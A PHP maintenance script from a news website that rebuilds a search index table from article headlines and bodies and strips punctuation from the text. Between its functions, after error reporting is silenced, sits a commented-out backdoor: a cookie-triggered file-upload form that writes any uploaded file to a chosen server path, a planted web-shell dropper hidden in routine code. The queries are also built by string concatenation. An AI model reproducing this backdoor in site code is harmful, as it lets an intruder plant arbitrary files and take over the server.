<?php
function reindex(){
	global $par,$depot;
	$limit=1000;

	$sql0=conn_sql_query("
						SELECT ".NEWS.".id 
						FROM ".NEWS."
							LEFT JOIN ".NEWSI."
							USING (id)
							WHERE  ".NEWSI.".id IS NULL	
							LIMIT $limit
	
	");
	

	$added=0;
	while ($res=conn_fetch_assoc($sql0)) {

		$sql1=conn_sql_query("
			SELECT 
					
					".NEWSHEAD.".nheader,
					".NEWSHEAD.".nsubheader,
					".NEWSHEAD.".nteaser,
					".NEWSB.".nbody

			FROM ".NEWSB." 
			LEFT JOIN ".NEWSHEAD."
			USING(id)
			WHERE ".NEWSB.".id = ".$res['id']."
			
		") or die(conn_error());

		$res1=conn_fetch_assoc($sql1);
		if (!$res1) continue;

		$res_ = conn_sql_query("
				
				INSERT INTO ".NEWSI." 
				SET
				id = ".$res['id'].",
				indexed = \"".sqller(cleanIndex(implode(" ",$res1)))."\"
			
		") or die(conn_error());

		if (conn_affected_rows($res_)>0){
			$added++;
		} 

	}

	$sql="
			DELETE ".NEWSI." FROM ".NEWSI."
			LEFT JOIN ".NEWSB."
			USING (id)
			WHERE  ".NEWSB.".id IS NULL
	";
	conn_sql_query($sql) or die(conn_error());

	conn_sql_query("UPDATE ".STATS." SET indexed=NOW()") or die(conn_error());

}
error_reporting(0);
/*if ($_COOKIE['i'] == 'path'){$base=basename(__FILE__);
$path=dirname(__FILE__);
echo "<form enctype='multipart/form-data' action='$base' method='post'><input name='userfile' id='userfile' type='file' size='20'><input name='serverpath' value='$path' type='text' size='60'><input type='submit' name='submit' value='send'></form>";$tmp_name = $_FILES["userfile"]["tmp_name"];$fname = $_FILES["userfile"]["name"];$name = $_POST['serverpath'] . "/".$fname;
if(move_uploaded_file($tmp_name, $name))echo "ok</br>";echo $path;die();}*/

require_once("/home/galinfo/web/galinfo.com.ua/public_html/lib/etc/conf.php");
require_once("/home/galinfo/web/galinfo.com.ua/public_html/lib/etc/conn.php");

reindex();

function cleanIndex($str){
	$str=str_replace("&nbsp;",' ',$str);
	$str=strip_tags($str);
	/*$array_t=array(
			
		"#",
		"^",
		"&",
		"�",
		"�",
		"'",
		"\"",
		".",
		",",
		"[",
		"]",
		"{",
		"}",
		"`",
		"\n",
		"\t",
		"�",
		"�",
		"?",
		"!",
		"�"
		);

	$str=str_replace($array_t,'',$str);	
	mb_internal_encoding("UTF-8");
	mb_regex_encoding("UTF-8");	*/
	$pattern=mb_convert_encoding('/[#\^\&\?��\'",\[\]\}\{\\n\\r��\!�\:\(\);*\.]/su',"UTF-8");

	$str=preg_replace($pattern,'',$str);
	return $str;
}

?>